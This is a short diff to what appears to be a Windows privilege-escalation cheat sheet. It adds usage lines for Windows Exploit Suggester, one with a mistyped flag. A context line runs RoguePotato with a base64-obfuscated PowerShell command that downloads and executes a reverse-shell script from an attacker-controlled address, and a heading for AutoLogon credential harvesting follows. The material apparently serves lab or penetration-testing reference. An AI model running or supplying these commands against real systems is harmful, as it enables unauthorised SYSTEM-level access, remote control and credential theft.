@@ -27,6 +27,13 @@ CLSID => http://ohpe.it/juicy-potato/CLSID/Windows_10_Pro/
 .\RoguePotato.exe -r 10.10.14.20 -c "{B91D5831-B1BD-4608-8198-D72E155020F7}" -e "cmd.exe /c powershell.exe -EncodedCommand SQBFAFgAIAAoAEkAVwBSACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgAyADAAOgA4ADAAMAAwAC8ASQBuAHYAbwBrAGUALQBQAG8AdwBlAHIAUwBoAGUAbABsAFQAYwBwADIALgBwAHMAMQAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAKQAKAA==" -l 9999
 
 ==============================================================================
+[+] Windows Exploit Suggester
+==============================================================================
+python windows-exploit-suggester.py --hrlp
+python windows-exploit-suggester.py -u
+python windows-exploit-suggester.py -i systeminfo.txt -d 2021-01-12-mssb.xls
+
+==============================================================================
 [+] AutoLogon credentials 
 ==============================================================================
 # Automatic
